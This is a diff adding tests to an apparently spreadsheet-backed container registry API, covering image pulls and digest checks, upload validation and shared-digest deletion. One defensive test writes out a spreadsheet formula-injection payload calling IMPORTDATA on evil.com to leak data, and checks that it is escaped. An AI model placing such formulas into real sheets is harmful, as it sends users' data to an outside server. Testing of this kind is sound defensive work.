@@ -377,7 +377,144 @@ check('Reassembled SHA-256 digest matches metadata digest', reassembledDigest ==
   actual: reassembledDigest
 });
 
-// Delete image and ensure cleanup
+// Pull seeded images and verify their digests and reassembly
+const pullWhoami = JSON.parse(api.doGet({
+  parameter: { token: validToken, kind: 'registry_pull', repo: 'sncf/hello-web', name: 'traefik/whoami', tag: 'latest' }
+})._t);
+check('Seeded whoami image pulls successfully', pullWhoami.ok && pullWhoami.chunks.length === 2, pullWhoami);
+const reassembledWhoami = pullWhoami.chunks
+  .sort((a, b) => Number(a.chunk_index) - Number(b.chunk_index))
+  .map(c => c.chunk_data).join('');
+const reassembledWhoamiBuf = Buffer.from(reassembledWhoami, 'base64');
+const whoamiHash = 'sha256:' + crypto.createHash('sha256').update(reassembledWhoamiBuf).digest('hex');
+check('Seeded whoami reassembled digest matches metadata digest exactly', whoamiHash === pullWhoami.image.digest, { expected: pullWhoami.image?.digest, actual: whoamiHash });
+
+const pullIngress = JSON.parse(api.doGet({
+  parameter: { token: validToken, kind: 'registry_pull', repo: 'sncf/sheeternetes-manifests', name: 'ingress-router', tag: 'v2.10' }
+})._t);
+check('Seeded ingress-router image pulls successfully', pullIngress.ok && pullIngress.chunks.length === 1, pullIngress);
+const reassembledIngress = pullIngress.chunks[0].chunk_data;
+const reassembledIngressBuf = Buffer.from(reassembledIngress, 'base64');
+const ingressHash = 'sha256:' + crypto.createHash('sha256').update(reassembledIngressBuf).digest('hex');
+check('Seeded ingress-router reassembled digest matches metadata digest exactly', ingressHash === pullIngress.image.digest, { expected: pullIngress.image?.digest, actual: ingressHash });
+
+// Formula injection protection test
+const formulaIssueRes = JSON.parse(api.doPost({
+  postData: {
+    contents: JSON.stringify({
+      token: validToken,
+      action: 'create_issue',
+      repo: 'sncf/hello-web',
+      title: '=IMPORTDATA("http://evil.com/leak")',
+      author: '+12345evil',
+      body: '@SUM(1,2)'
+    })
+  }
+})._t);
+check('Formula injection inputs accepted and safely handled', formulaIssueRes.ok && formulaIssueRes.issue, formulaIssueRes);
+const rawStoreRows = store['Issues'].grid;
+const injectedRow = rawStoreRows.find(r => r && r.some(cell => String(cell).includes('IMPORTDATA')));
+check('Formula injection string has single-quote prefix in raw sheet cells', injectedRow && injectedRow.some(cell => cell === '\'=IMPORTDATA("http://evil.com/leak")'), injectedRow);
+const issuesReadBack = api.readTab('Issues');
+const unescapedIssue = issuesReadBack.find(i => i.title === '=IMPORTDATA("http://evil.com/leak")');
+check('readTab seamlessly unescapes formula strings back to clean text', !!unescapedIssue, unescapedIssue);
+
+// Negative test: Reject undecodable base64 without fabricating sha256:unknown
+const undecodableRes = JSON.parse(api.doPost({
+  postData: {
+    contents: JSON.stringify({
+      token: validToken,
+      action: 'push_image',
+      repo: 'sncf/hello-web',
+      name: 'broken-b64',
+      tag: 'latest',
+      chunks: ['!!!NotValidBase64@@@']
+    })
+  }
+})._t);
+check('push_image rejects invalid/undecodable base64 without fabricating digest', undecodableRes.error && !undecodableRes.ok, undecodableRes);
+
+// Negative test: Reject empty / zero-byte layer push
+const emptyPushRes = JSON.parse(api.doPost({
+  postData: {
+    contents: JSON.stringify({
+      token: validToken,
+      action: 'push_image',
+      repo: 'sncf/hello-web',
+      name: 'empty-layer',
+      tag: 'latest',
+      chunks: ['']
+    })
+  }
+})._t);
+check('push_image rejects empty / zero-byte layer', emptyPushRes.error && emptyPushRes.error.includes('empty'), emptyPushRes);
+
+// Negative test: Reject payload exceeding max chunk count cap
+const tooManyChunks = Array.from({ length: 501 }, (_, i) => 'AAAA');
+const capExceededRes = JSON.parse(api.doPost({
+  postData: {
+    contents: JSON.stringify({
+      token: validToken,
+      action: 'push_image',
+      repo: 'sncf/hello-web',
+      name: 'huge-layer',
+      tag: 'latest',
+      chunks: tooManyChunks
+    })
+  }
+})._t);
+check('push_image rejects uploads exceeding max chunk count cap', capExceededRes.error && capExceededRes.error.includes('maximum allowed'), capExceededRes);
+
+// Shared digest delete guard test: two image tags sharing a digest
+const sharedPayload = Buffer.from('Shared layer chunk content across tags', 'utf8');
+const sharedB64 = sharedPayload.toString('base64');
+const sharedDigest = 'sha256:' + crypto.createHash('sha256').update(sharedPayload).digest('hex');
+
+api.doPost({
+  postData: {
+    contents: JSON.stringify({
+      token: validToken, action: 'push_image', repo: 'sncf/hello-web',
+      name: 'shared-svc', tag: 'v1.0.0', content: sharedB64, digest: sharedDigest
+    })
+  }
+});
+api.doPost({
+  postData: {
+    contents: JSON.stringify({
+      token: validToken, action: 'push_image', repo: 'sncf/hello-web',
+      name: 'shared-svc', tag: 'v1-alias', content: sharedB64, digest: sharedDigest
+    })
+  }
+});
+
+// Delete v1.0.0
+const delV1Res = JSON.parse(api.doPost({
+  postData: {
+    contents: JSON.stringify({
+      token: validToken, action: 'delete_image', repo: 'sncf/hello-web',
+      image: 'shared-svc:v1.0.0'
+    })
+  }
+})._t);
+check('delete_image v1.0.0 returns ok', delV1Res.ok && delV1Res.deleted, delV1Res);
+
+// Verify chunks are STILL present because v1-alias uses the same digest
+const chunksAfterFirstDelete = api.readTab('RegistryChunks');
+check('shared chunks preserved in RegistryChunks when alias still exists', chunksAfterFirstDelete.some(c => c.digest === sharedDigest), chunksAfterFirstDelete.length);
+
+// Delete v1-alias
+api.doPost({
+  postData: {
+    contents: JSON.stringify({
+      token: validToken, action: 'delete_image', repo: 'sncf/hello-web',
+      image: 'shared-svc:v1-alias'
+    })
+  }
+});
+const chunksAfterSecondDelete = api.readTab('RegistryChunks');
+check('shared chunks cleaned up after last image using digest is deleted', !chunksAfterSecondDelete.some(c => c.digest === sharedDigest), chunksAfterSecondDelete.length);
+
+// Delete test web-service image and ensure cleanup
 const deleteRes = JSON.parse(api.doPost({
   postData: {
     contents: JSON.stringify({
